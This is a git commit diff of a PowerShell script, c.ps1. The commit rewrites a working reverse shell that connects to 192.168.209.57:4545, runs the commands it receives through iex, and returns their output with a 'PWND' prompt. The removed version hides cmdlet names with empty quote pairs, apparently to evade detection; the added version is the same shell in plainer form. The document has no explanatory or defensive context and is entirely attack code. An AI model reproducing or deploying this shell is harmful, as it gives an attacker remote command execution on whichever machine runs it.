43c2eed68ba3b448f93e8e3240291cde9731a07b
Maciej Mazur <marowid@gmail.com>
2024-01-27 11:55:29 +0100

    Update c.ps1

--- c.ps1
+++ c.ps1
@@ -1,4 +1,8 @@
-$ip = "192.168.209.57"
-$port = "4545"
- 
-$c= New-Obje''ct System.Net.Sockets.TCPClient($ip,$port);$s= $c.GetStream();[byte[]]$b= 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d= (N''e''w-O''b''j''e''c''t -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex ". { $d} 2>&1" | Out-String );$sendback2 = $sendback + 'PWND'+' ' + (p''w''d).Path + '->';$sb= ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sb,0,$sb.Length);$stream.Flush()};$client.Close()
+$A='192.168.209.57';$B='4545';
+$C=New-Object System.Net.Sockets.TCPClient($A,$B);$D=$C.GetStream();
+[Byte[]]$E=0..65535|%{0};while(($F=$D.Read($E,0,$E.Length)) -ne 0){
+$G=(New-Object System.Text.ASCIIEncoding).GetString($E,0,$F);
+$H=(iex ". {$G} 2>&1" | Out-String);
+$I=$H+'PWND '+' '+(pwd).Path+'->';
+$J=([Text.Encoding]::ASCII).GetBytes($I);$D.Write($J,0,$J.Length);$D.Flush()};
+$C.Close()
